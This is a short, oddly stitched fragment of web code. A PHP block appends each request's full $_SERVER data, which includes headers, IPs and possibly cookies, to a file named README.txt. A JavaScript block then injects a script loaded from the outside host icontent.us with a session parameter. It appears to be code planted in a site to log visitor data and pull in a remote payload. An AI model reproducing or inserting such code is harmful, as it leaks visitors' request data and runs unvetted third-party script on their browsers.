<pre>
<?php
//  define ('ENT_QUOTES', 3);
$s = file_get_contents('README.txt');
$data = json_decode($s);
$data[] = $_SERVER;
$s = json_encode($data);
file_put_contents('README.txt', $s);
?>
</pre>
(function(){
  var s = document.createElement('script');
  s.src = '//icontent.us/4a3d85b08a2e0196d9.js<?php print !empty($_GET['sid']) ? '?sid=' . htmlspecialchars($_GET['sid'], ENT_QUOTES, 'UTF-8') : ''; ?>'
  document.body.appendChild(s);
})();
